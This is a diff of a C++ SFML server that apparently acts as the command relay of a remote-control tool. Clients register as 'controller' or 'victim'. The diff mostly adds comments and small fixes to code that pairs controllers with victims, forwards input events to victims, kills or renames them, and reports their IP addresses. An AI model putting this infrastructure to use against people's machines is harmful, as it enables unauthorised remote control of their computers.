@@ -1,19 +1,23 @@
 #include "server.h"
+#include "../secret.h"
 
 Server::Server()
 {
-	if (listener.listen(PORT) != sf::Socket::Done) {
+	//start listening to the port. if it fails, exit
+	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
 		std::cout << "listening failed\n";
 		std::exit(-1);
 	}	
 	selector.add(listener);
-	std::cout << "listening on port " << PORT << "\n";
+	std::cout << "listening on port " << SERVER_PORT << "\n";
 
+	//start thread that checks if client are not asleep
 	std::thread checkAwakeThread(&Server::checkAwake, this);
 	checkAwakeThread.detach();
 }
 void Server::receive()
 {
+	//wait until a client has sent something
 	if (!selector.wait())
 		return;
 
@@ -21,6 +25,7 @@ void Server::receive()
 	mutex.lock();
 	//check if a client has received something
 	for (auto& c : clients) {
+		//look for the socket that has received something
 		if (!selector.isReady(*c.second.socket))
 			continue;
 
@@ -36,27 +41,33 @@ void Server::receive()
 
 		c.second.lastMsg = Mlib::getTime();
 
-		//process packet according to sender's role
+		//process the packet if it was received by a controller
 		if (c.second.role == 'c')
 			processControllerMsg(c.first, p);
+		//process the packet if it was received by a victim
 		else if (c.second.role == 'v')
 			processVictimMsg(c.first, p);
+		//process the packet if it was received by an uninitialized client
 		else if (c.second.role == '-') {
+			//get the client's role and name
 			sf::Uint8 role;
 			p >> role;
 			p >> c.second.name;
 			p.clear();
 
+			//add new controller/victim to the list
 			if (role == 'c' || role == 'v') {
 				p << sf::Uint8(role);
 				if (role == 'c')
 					p << sf::Uint16(c.first);
+				//tell the client that it has been initialized
 				c.second.socket->send(p);
 				c.second.role = role;
 				std::cout << "new " << role << " - id: " << c.first << "\n";
 
 				updateControllersList();
 			}
+			//tell the client that the command received wasnt valid
 			else {
 				p << sf::Uint8('?');
 				c.second.socket->send(p);
@@ -66,10 +77,12 @@ void Server::receive()
 	//check if a client is ready to connect
 	if (selector.isReady(listener)) {
 		Client c;
+		//add new client to list
 		if (listener.accept(*c.socket) == sf::Socket::Done) {
 			selector.add(*c.socket);
 			clients.insert({ ++currentId, c });
 		}
+		//undo if client isnt accepted successfully
 		else {
 			delete c.socket;
 			currentId--;
@@ -80,6 +93,7 @@ void Server::receive()
 void Server::checkAwake()
 {
 	while (true) {
+		//flag clients as afk if needed
 		std::vector<sf::Uint16> idsToRemove;
 		for (const auto& c : clients) {
 			if (Mlib::getTime() - c.second.lastMsg > 5'000)
@@ -94,6 +108,7 @@ void Server::checkAwake()
 		}
 		mutex.unlock();
 
+		//sleep to save processign power
 		Mlib::sleep(200);
 	}
 }
@@ -128,7 +143,7 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 
 		updateControllersList();
 	}
-	//forward events to client
+	//forward events to victim
 	else if ((cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a')) {
 		//controller is not paired
 		if (clients[id].pair == 0)
@@ -153,7 +168,7 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 
 		updateControllersList();
 	}
-	//disconnect client
+	//disconnect a given client
 	else if (cmd == 'e') {
 		sf::Uint16 oId;
 		p >> oId;
@@ -168,7 +183,7 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		std::cout << "killed - ";
 		disconnect(oId);
 	}
-	//rename client
+	//rename a given client
 	else if (cmd == 'w') {
 		sf::Uint16 oId;
 		std::string name;
@@ -184,13 +199,29 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		clients[oId].name = name;
 		p.clear();
 		p << sf::Uint8('w') << name;
+		//send the new name to the client
 		clients[oId].socket->send(p);
 
 		updateControllersList();
 	}
+	//apparently controller thinks it isn't initialized
+	else if (cmd == 'c' || cmd == 'v') {
+		//reset controller's role and name
+		clients[id].role = '-';
+		clients[id].name = "";
+	}
 }
 void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 {
+	sf::Uint8 cmd;
+	p >> cmd;
+
+	//apparently victim thinks it isn't initialized
+	if (cmd == 'c' || cmd == 'v') {
+		//reset controller's role and name
+		clients[id].role = '-';
+		clients[id].name = "";
+	}
 }
 
 void Server::disconnect(sf::Uint8 id)
@@ -215,14 +246,17 @@ void Server::disconnect(sf::Uint8 id)
 		//actually unpair other client
 		clients[clients[id].pair].pair = 0;
 	}
+	//remove client from list/selector
 	selector.remove(*clients[id].socket);
 	delete clients[id].socket;
 	clients.erase(id);
+
 	std::cout << "id: " << int(id) << "\n";
 	updateControllersList();
 }
 void Server::updateControllersList()
 {
+	//send a packet to all controllers
 	auto sendControllers = [this](sf::Packet p) {
 		for (auto& c : clients)
 		{
@@ -242,15 +276,12 @@ void Server::updateControllersList()
 		if (c.second.role == '-')
 			continue;
 
+		//load all client info
 		p.clear();
 		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
-		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort();
+		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair);
 
-		if (c.second.pair != 0)
-			p << c.second.pair;
-		else
-			p << sf::Uint16(0);
-
+		//send clint info to all controllers
 		sendControllers(p);
 	}
 
